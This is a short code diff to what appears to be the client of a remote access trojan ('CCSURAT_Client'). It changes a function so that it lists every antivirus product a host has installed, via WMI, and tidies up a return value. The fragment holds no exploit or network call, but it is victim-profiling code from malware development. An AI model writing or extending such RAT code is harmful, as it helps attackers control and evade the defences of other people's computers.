@@ -60,21 +60,23 @@ namespace CCSURAT_Client
             return total.ToString() + " GB";
         }
 
-        // Attempts to grab AV from WMI, test have shown that this may not work properly. Rework.
+        // Attempts to grab AV(s) from WMI, test have shown that this may not work properly. Rework.
         public static string GetAV()
         {
+            string AV = "";
             try
             {
                 ManagementObjectSearcher searcher = null;
                 searcher = new ManagementObjectSearcher("root\\SecurityCenter2", "SELECT * FROM AntiVirusProduct");
                 foreach (ManagementObject mObj in searcher.Get())
-                    return mObj["displayName"].ToString();
+                    AV += mObj["displayName"].ToString() + ", ";
+                AV = AV.Substring(0, AV.Length - 2);
             }
             catch (Exception ex)
             {
                 return "Not Found";
             }
-            return "Not Found";
+            return AV;
         }
         #endregion
 
@@ -165,7 +167,7 @@ namespace CCSURAT_Client
             {
                 return Buff.ToString();
             }
-            return null;
+            return "Not Found";
         }
 
         [DllImport("user32.dll")]
